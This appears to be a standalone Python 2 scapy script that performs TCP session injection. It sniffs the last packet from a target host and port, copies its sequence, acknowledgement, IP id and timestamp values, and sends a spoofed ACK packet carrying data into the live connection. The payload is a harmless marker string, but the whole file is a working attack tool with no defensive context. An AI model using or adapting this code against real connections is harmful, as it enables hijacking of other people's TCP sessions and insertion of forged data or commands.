#!/usr/bin/env python

# $Id$

from scapy.all import conf,IP,TCP,sniff,send

conf.verb = 1 

import random
import re
import sys

target = sys.argv[1]
my_dport = int(sys.argv[2])

pkts = "" 
while 1 == 1:
  tmp = sniff(filter="ip and tcp and src port "+str(my_dport)+" and src host "+str(target),timeout = 2, count = 1)#, lfilter = lambda x: x.sport == my_dport)
  if len(tmp) > 0:
    pkts = tmp
  else:
    if len(pkts) > 0:
      break

pkts.nsummary()
lpkt = pkts[0]

try:
  my_ack = lpkt.seq+len(lpkt.load)
except:
  my_ack = lpkt.seq

my_seq = lpkt.ack
my_sport = lpkt.dport 

### got timestamp
tseho = 0
for opt in lpkt.getlayer(TCP).options:
  if "Timestamp" in opt:
    tseho = opt[1][0]
tsval = tseho + 3 

ip = IP(dst = target)

data="######injected######\n"

ip.id = lpkt.id+1
ip.flags = lpkt.flags

pkt = ip/TCP(sport = my_sport, dport = my_dport, flags = "A", seq = my_seq, ack = my_ack, window = lpkt.window+1)/data

if tseho > 0:
  pkt.payload.options = [('NOP', None), ('NOP', None),('Timestamp',(tsval,tseho))] 

print "####### sending:"

send(pkt)
